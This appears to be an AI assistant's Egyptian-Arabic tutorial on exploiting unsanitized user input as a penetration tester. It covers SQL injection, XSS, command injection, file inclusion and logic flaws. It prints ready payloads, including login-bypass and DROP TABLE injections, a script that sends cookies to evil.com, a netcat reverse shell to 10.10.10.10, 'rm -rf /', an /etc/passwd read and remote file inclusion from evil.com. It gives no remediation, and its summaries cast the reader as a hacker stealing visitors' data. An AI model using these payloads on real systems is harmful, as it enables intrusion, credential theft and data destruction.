تمام، هشرحلك موضوع "Exploiting Unsanitized User Input" بعمق من منظور عملي كـ Penetration Tester (Pentester)، وهديك أمثلة عملية بالأوامر والأكواد، وهحط الخلاصة بالعامية المصرية بعد كل جزء، وبعدين هعدلك كل السيناريوهات الممكنة للاستغلال.

---

### **1. مفهوم Unsanitized User Input بعمق**
في أي نظام أو تطبيق (زي موقع ويب أو برنامج)، لما المستخدم بيدخل بيانات (زي اسم، باسورد، تعليق، أو حتى حاجة في شريط البحث)، البيانات دي بتروح للسيرفر عشان يتعامل معاها. لو المبرمج ما عملش "Sanitization" أو "Validation" كويس، يعني ما حطش قواعد صلبة على شكل البيانات المسموح بيها أو ما نظفهاش من الأكواد الخبيثة، هنا بتبقى في نقطة ضعف.

ء **Sanitization** يعني تنضيف البيانات من أي حاجة ممكن تتنفذ ككود (زي أوامر SQL أو JavaScript).  
ء **Validation** يعني التأكد إن البيانات دي فعلاً شكلها صح (مثلاً: رقم تليفون لازم يكون أرقام بس، مش حروف).

لو التنضيف ده ما حصلش، البيانات ممكن تتحول من مجرد "إنبوت عادي" لـ "كود يتنفذ"، وده اللي بنستغلاه كـ Pentesters.

**خلاصة بالعامية:**  
يعني لو الموقع أو البرنامج "مفتوح الباب" ومش بيشوف اللي داخل منك نظيف ولا لأ، يبقى إنت كـ هاكر ممكن تدخل أي حاجة تخرب بيها الدنيا.

---

### **2. الجانب العملي: أنواع الهجمات الشائعة**
هنشرح أهم الطرق اللي بنستغل بيها الـ Unsanitized Input مع أمثلة عملية:

#### **أ. SQL Injection**
لو موقع بياخد إنبوت من المستخدم (زي حقل لوجن) وبيحطه مباشرة في استعلام SQL من غير تنضيف، ممكن نستغل ده.

- **مثال عملي:**
  لنفرض في حقل Username وPassword في صفحة لوجن، والكود في الباك إند كده:
  ```
  SELECT * FROM users WHERE username = '$username' AND password = '$password';
  ```
  لو المستخدم دخل في حقل Username: `admin' --` وفي Password أي حاجة، الاستعلام هيبقى:
  ```
  SELECT * FROM users WHERE username = 'admin' --' AND password = 'whatever';
  ```
  الـ `--` دي تعليق في SQL، يعني كل اللي بعده مش هيتنفذ، وهيتسجل دخولك كـ admin من غير ما تحتاج الباسورد.

- **أمر عملي كـ Pentester:**
  جرب تدخل في حقل الإنبوت:
  ```
  ' OR 1=1 --
  ```
  لو الموقع سمحلك تدخل من غير باسورد، يبقى في ثغرة SQL Injection.

**خلاصة بالعامية:**  
الموقع لو بياخد الكلام اللي بتكتبه ويحطه في الداتابيز من غير ما يشوفه، ممكن تكتب جملة "افتحلي الباب" ويدخلك كأنك صاحب المكان.

#### **ب. Cross-Site Scripting (XSS)**
لو موقع بيسمح لك تكتب تعليق أو حاجة تتعرض على صفحة، وما بينضفش الإنبوت، ممكن تدخل JavaScript يتنفذ في متصفح المستخدمين.

- **مثال عملي:**
  لنفرض في حقل تعليق، وكتبت فيه:
  ```
  <script>alert('Hacked!');</script>
  ```
  لو الموقع عرض التعليق زي ما هو من غير ما يحول الـ `<script>` لنص عادي، هيطلعلك أليرت في الصفحة، وده يثبت إنه عرضة لـ XSS.

- **استغلال أعمق:**
  ممكن تدخل كود يسرق الكوكيز (جلسة المستخدم):
  ```
  <script>document.location='http://evil.com?cookie='+document.cookie;</script>
  ```
  لما حد يفتح الصفحة، الكوكيز بتاعته هتروح للموقع اللي إنت عملته.

- **أمر عملي كـ Pentester:**
  جرب في أي حقل إنبوت (زي Search أو Comment):
  ```
  <script>console.log('Test');</script>
  ```
  افتح Developer Tools (F12) وشوف لو الكونسول طبع "Test"، يبقى في XSS.

**خلاصة بالعامية:**  
الموقع لو بياخد الكلام اللي بتكتبه ويحطه زي ما هو على الصفحة، ممكن تكتب حاجة تخلي المتصفح يعمل أي حاجة إنت عايزها، زي ما تسرق بيانات اللي بيزوروا الموقع.

#### **ج. Command Injection**
لو تطبيق بياخد إنبوت ويحطه في أمر للنظام (زي Linux أو Windows)، ممكن نستغل ده.

- **مثال عملي:**
  لنفرض موقع فيه حقل بياخد IP عشان يعمل ping، والكود كده:
  ```
  system("ping " . $input);
  ```
  لو كتبت في الحقل:
  ```
  127.0.0.1 && whoami
  ```
  الأمر هيتنفذ كده:
  ```
  ping 127.0.0.1 && whoami
  ```
  الـ `&&` بتخلي النظام ينفذ أمر تاني، وهيرجعلك اسم المستخدم اللي السيرفر شغال بيه.

- **أمر عملي كـ Pentester:**
  جرب في حقل إنبوت مشابه:
  ```
  ; ls -la
  ```
  أو لو Windows:
  ```
  & dir
  ```
  لو رجعلك نتايج، يبقى في Command Injection.

**خلاصة بالعامية:**  
الموقع لو بياخد كلامك ويروح ينفذه كأمر على السيرفر من غير ما يفهمه، ممكن تخليه يعمل أي حاجة، زي ما تفتحله باب خلفي.

---

### **3. سيناريوهات الاستغلال الممكنة كـ Pentester**
دلوقتي بعد الشرح، هعدلك كل السيناريوهات اللي ممكن تستغل بيها الـ Unsanitized User Input:

1. **SQL Injection:**
   - تسجيل دخول من غير بيانات صحيحة (`' OR 1=1 --`).
   - استخراج بيانات الداتابيز (`' UNION SELECT username, password FROM users --`).
   - حذف الداتابيز (`'; DROP TABLE users; --`).

2. **XSS (Stored):**
   - تخزين كود خبيث في تعليق أو بروفايل يتنفذ لكل الزوار.
   - سرقة الكوكيز أو جلسات المستخدمين.
   - توجيه المستخدمين لموقع خبيث.

3. **XSS (Reflected):**
   - إنك ترسل لينك مضروب (زي `http://site.com/search?q=<script>alert(1)</script>`) لحد ويتنفذ الكود لما يفتحه.
   - سرقة بيانات من صفحة معينة.

4. **Command Injection:**
   - تنفيذ أوامر زي `whoami` أو `id` عشان تعرف مين شغال على السيرفر.
   - فتح شيل عكسي (`; nc -e /bin/sh 10.10.10.10 4444`).
   - حذف ملفات أو تدمير النظام (`; rm -rf /`).

5. **File Inclusion (Local/Remote):**
   - لو الإنبوت بيخش في كود زي `include($input);`، جرب:
     - `../../etc/passwd` (Local File Inclusion).
     - `http://evil.com/shell.txt` (Remote File Inclusion).

6. **Authentication Bypass:**
   - لو الإنبوت بيروح لفحص بيانات، جرب حاجات زي:
     - `admin' OR '1'='1` (للدخول كأدمن).
     - `null` أو قيم غريبة تعطل الفحص.

7. **Logic Flaws:**
   - لو إنبوت زي كمية منتج في متجر، جرب تدخل `-1` تشتري حاجة ببلاش أو تعكس الفلوس.

---

### **نصيحة كـ Pentester:**
- استخدم أدوات زي **Burp Suite** عشان تعدل الإنبوت وتشوف السيرفر بيرد ازاي.
- جرب كل أنواع الإنبوت الغريبة (حروف، أرقام، رموز، أكواد).
- ركز على النقط اللي المستخدم بيتفاعل معاها (حقول، لينكات، فورم).

لو عايز شرح أعمق لأي سيناريو أو أداة معينة، قوللي!